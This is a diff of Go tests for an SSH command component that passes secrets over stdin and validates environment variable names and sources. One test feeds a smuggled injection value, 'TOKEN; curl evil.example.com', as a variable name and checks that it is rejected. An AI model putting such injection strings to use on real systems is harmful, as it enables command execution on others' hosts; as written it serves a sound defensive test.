@@ -611,7 +611,7 @@ func TestSSHCommand_BuildRemoteCommand(t *testing.T) {
 			"docker run --rm app",
 		)
 
-		assert.Equal(t, `env PUBLIC='prod' sh -lc 'eval "$(cat)"; docker run --rm app'`, command)
+		assert.Equal(t, `env PUBLIC='prod' sh -lc 'eval "$(cat)" && docker run --rm app'`, command)
 		assert.Equal(t, "export TOKEN='t0k'\n", payload)
 		assert.NotContains(t, command, "t0k")
 	})
@@ -623,7 +623,7 @@ func TestSSHCommand_BuildRemoteCommand(t *testing.T) {
 			"deploy.sh",
 		)
 
-		assert.Equal(t, `sh -lc 'eval "$(cat)"; cd '"'"'/srv'"'"' && deploy.sh'`, command)
+		assert.Equal(t, `sh -lc 'eval "$(cat)" && cd '"'"'/srv'"'"' && deploy.sh'`, command)
 		assert.Equal(t, "export TOKEN='t0k'\n", payload)
 	})
 
@@ -790,7 +790,7 @@ func TestSSHCommand_BuildExecutionCommand(t *testing.T) {
 		}, "")
 
 		require.NoError(t, err)
-		assert.Equal(t, `sh -lc 'eval "$(cat)"; docker run --rm app'`, command)
+		assert.Equal(t, `sh -lc 'eval "$(cat)" && docker run --rm app'`, command)
 		require.NotNil(t, stdin)
 
 		body, readErr := io.ReadAll(stdin)
@@ -1200,6 +1200,38 @@ func TestValidateEnvironment(t *testing.T) {
 		assert.Contains(t, err.Error(), "environment variable TOKEN")
 		assert.Contains(t, err.Error(), `invalid value source: "vault"`)
 	})
+
+	// Literals ride in the `env` prefix and secrets are exported over stdin, so
+	// with a duplicate name the secret wins no matter where it sits in the list.
+	// The order in the UI would stop matching what runs, so a duplicate is
+	// rejected outright — the same rule the runner component applies.
+	t.Run("rejects a duplicate name", func(t *testing.T) {
+		err := validateEnvironment([]EnvironmentVariable{
+			{Name: "TOKEN", Value: "literal"},
+			{
+				Name:        "TOKEN",
+				ValueSource: EnvironmentValueSourceSecret,
+				Secret:      configuration.SecretKeyRef{Secret: "vault", Key: "token"},
+			},
+		})
+		require.Error(t, err)
+		assert.Contains(t, err.Error(), "duplicate environment variable name: TOKEN")
+	})
+
+	// The console drops the value field when the source is secret, but a node
+	// published through the API keeps whatever it was sent. Rejecting the pair
+	// stops a plaintext credential from outliving the switch to a secret.
+	t.Run("rejects a secret variable that still carries a literal value", func(t *testing.T) {
+		err := validateEnvironment([]EnvironmentVariable{{
+			Name:        "DB_PASSWORD",
+			ValueSource: EnvironmentValueSourceSecret,
+			Secret:      configuration.SecretKeyRef{Secret: "prod-db", Key: "password"},
+			Value:       "leftover-plaintext",
+		}})
+		require.Error(t, err)
+		assert.Contains(t, err.Error(), "DB_PASSWORD")
+		assert.Contains(t, err.Error(), "value must be empty")
+	})
 }
 
 func TestSSHCommand_Documentation_DescribesSecretEnvironmentVariables(t *testing.T) {
@@ -1207,6 +1239,11 @@ func TestSSHCommand_Documentation_DescribesSecretEnvironmentVariables(t *testing
 
 	assert.Contains(t, documentation, "key from an organization secret")
 	assert.Contains(t, documentation, "stdin")
+	assert.Contains(t, documentation, "Names must be unique")
+	// The transport keeps the value out of argument vectors, not out of the
+	// process environment. Saying so is what stops a reader from treating this
+	// as a stronger guarantee than it is.
+	assert.Contains(t, documentation, "environ")
 }
 
 func TestSSHCommand_Configuration_EnvironmentValueSource(t *testing.T) {
@@ -1282,6 +1319,33 @@ func TestSSHCommand_Configuration_EnvironmentValueSource(t *testing.T) {
 		require.NoError(t, err)
 	})
 
+	// Explains why the empty string belongs in the visibility condition but not
+	// in the required condition. A legacy variable omits valueSource entirely,
+	// and isRequiredByCondition skips a condition whose field is absent. An
+	// explicitly empty source never reaches that logic at all — the select
+	// validation rejects it first — so listing "" as a required condition would
+	// only ever be dead weight.
+	t.Run("an explicitly empty value source is rejected as an unknown option", func(t *testing.T) {
+		assert.Equal(t, []configuration.RequiredCondition{
+			{Field: "valueSource", Values: []string{EnvironmentValueSourceLiteral}},
+		}, byName["value"].RequiredConditions)
+
+		err := configuration.ValidateConfiguration(fields, map[string]any{
+			"host":     "example.com",
+			"port":     22,
+			"username": "root",
+			"authentication": map[string]any{
+				"authMethod": AuthMethodPassword,
+				"password":   map[string]any{"secret": "my-secret", "key": "password"},
+			},
+			"commands":    "echo hi",
+			"timeout":     60,
+			"environment": []any{map[string]any{"name": "ENVIRONMENT", "valueSource": ""}},
+		})
+		require.Error(t, err)
+		assert.Contains(t, err.Error(), "must be one of: literal, secret")
+	})
+
 	t.Run("accepts a secret-backed variable", func(t *testing.T) {
 		err := configuration.ValidateConfiguration(fields, map[string]any{
 			"host":     "example.com",
@@ -1326,6 +1390,31 @@ func TestResolveEnvironment(t *testing.T) {
 
 		require.NoError(t, err)
 		assert.Equal(t, []resolvedEnvVar{{Name: "DB_PASSWORD", Value: "s3cret", Secret: true}}, resolved)
+	})
+
+	// A variable name is interpolated into `export NAME=...` and `env NAME=...`
+	// without quoting — it cannot be quoted and stay an assignment. Resolution
+	// runs on the retry path, which rebuilds the command from metadata, so the
+	// name has to be checked here and not only where the node is published.
+	t.Run("rejects a name that would break out of the assignment", func(t *testing.T) {
+		_, err := resolveEnvironment(secrets, []EnvironmentVariable{
+			{Name: "TOKEN; curl evil.example.com", Value: "x"},
+		})
+
+		require.Error(t, err)
+		assert.Contains(t, err.Error(), "invalid environment variable name")
+	})
+
+	t.Run("reports a missing secrets context instead of panicking", func(t *testing.T) {
+		_, err := resolveEnvironment(nil, []EnvironmentVariable{{
+			Name:        "DB_PASSWORD",
+			ValueSource: EnvironmentValueSourceSecret,
+			Secret:      configuration.SecretKeyRef{Secret: "prod-db", Key: "password"},
+		}})
+
+		require.Error(t, err)
+		assert.Contains(t, err.Error(), "DB_PASSWORD")
+		assert.Contains(t, err.Error(), "secrets are not available")
 	})
 
 	t.Run("fails naming the variable when the secret is missing", func(t *testing.T) {
